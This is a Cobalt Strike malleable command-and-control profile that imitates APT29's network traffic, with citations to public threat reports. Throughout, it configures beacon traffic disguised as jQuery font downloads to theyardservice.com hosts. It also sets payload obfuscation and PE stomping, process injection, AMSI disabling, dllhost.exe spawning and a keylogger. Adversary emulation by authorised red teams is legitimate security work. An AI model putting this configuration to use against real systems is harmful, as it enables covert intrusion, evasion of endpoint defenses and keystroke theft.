#dukes_apt29.profile
#https://www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launches-election-fraud-themed-phishing-campaigns/
#https://malshare.com/sample.php?action=detail&hash=1c3b8ae594cb4ce24c2680b47cebf808
#https://us-cert.cisa.gov/ncas/analysis-reports/ar21-148a
#xx0hcd

###Global Options###
set sample_name "dukes_apt29.profile";

set sleeptime "60591";
set jitter    "37";
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   "";
    set dns_stager_subhost   "";
     
    # DNS subhost override options added in 4.3:
    set beacon               "";
    set get_A                "";
    set get_AAAA             "";
    set get_TXT              "";
    set put_metadata         "";
    set put_output           "";
    set ns_response          "";
}

###SMB options###
set pipename "ntsvcs_##";
set pipename_stager "scerpc_##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#https-certificate {
#    set keystore "";
#    set password "";
#}

#https-certificate {
#    set C "US";
#    set CN "whatever.com";
#    set L "California";
#    set O "whatever LLC.";
#    set OU "local.org";
#    set ST "CA";
#    set validity "365";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";

    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/jquery-3.3.1.min.woff2";
    
    client {

        header "Accept" "*/*";
        header "Host" "dataplane.theyardservice.com";
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";

	   
    metadata {
        base64;
        prepend "_cfuid=";
        header "Cookie";

    }

    }

    server {
    
        header "Accept" "*/*";
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
 
        output {

            netbios;
            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/jquery-3.3.2.min.woff2";
    #set verb "GET";
    set verb "POST";

    client {

	header "Host" "cdn.theyardservice.com";
	header "Accept" "*/*";
	header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
        
        output {
            base64url;
	    print;
        }

        id {
	    base64url;
	    prepend "_cfuid=";
            header "Cookie";

        }
    }

    server {
    
        header "Accept" "*/*";
	header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";

        output {
            netbios;
            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {

    set uri_x86 "/root/Time/27/28.json";
    set uri_x64 "/root/time/27/28.json";

    client {
        
	header "Accept" "*/*";
	header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
    }

    server {
        
        header "Accept" "*/*";
	header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
	
	output {
	
	    prepend "";
	    
	    append "";
	    print;
	}

    }
}


###Malleable PE/Stage Block###
stage {
    set checksum       "0";
    set compile_time   "27 Apr 2019 13:24:28";
    set entry_point    "32308";
    set image_size_x86 "1798144";
    set image_size_x64 "1798144";
    set name           "Dll6.dll";

    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "\x1d\x67\x43\x53\x59\x06\x2d\x00\x59\x06\x2d\x00\x59\x06\x2d\x00\x3c\x60\x29\x01\x4c\x06\x2d\x00\x3c\x60\x2e\x01\x49\x06\x2d\x00\x3c\x60\x28\x01\xe0\x06\x2d\x00\x0b\x6e\x28\x01\x47\x06\x2d\x00\x0b\x6e\x29\x01\x49\x06\x2d\x00\x0b\x6e\x2e\x01\x51\x06\x2d\x00\x3c\x60\x2c\x01\x5e\x06\x2d\x00\x59\x06\x2c\x00\x28\x06\x2d\x00\xce\x6f\x29\x01\x5a\x06\x2d\x00\xce\x6f\x2d\x01\x58\x06\x2d\x00\xce\x6f\xd2\x00\x58\x06\x2d\x00\xce\x6f\x2f\x01\x58\x06\x2d\x00\x52\x69\x63\x68\x59\x06\x2d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
      
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";
    
    set sleep_mask "true";
    
    set smartinject "true";

    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    string "irnjadle";
    string "BADCFEHGJILKNMPORQTSVUXWZY";
    string "iMrcsofo taBesC yrtpgoarhpciP orived r1v0.";
    string "%s (admin)";
    string "{48 54 54 50 2F 31 2E 31 20 32 30 30 20 4F 4B 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 6F 63 74 65 74 2D 73 74 72 65 61 6D 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 25 64 0D 0A 0D 0A 00}";
    string "%02d/%02d/%02d %02d:%02d:%02d";
    string "%s as %s\\%s: %d";
    string "%s&%s=%s";
    string "rijndael";
    string "(null)";
    string "UlswcXJJWhtHIHrVqWJJ";
    string "gyibvmt\x00";
    string "root/time/%d/%s.json";
    string "C:\\dell.sdr";
    string "root/data/%d/%s.json";
    string "나타나게 하다";
    string "natanage hada";

}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90";
    }
    transform-x64 {
        prepend "\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        #SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "ntdll.dll!RtlUserThreadStart+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";

}

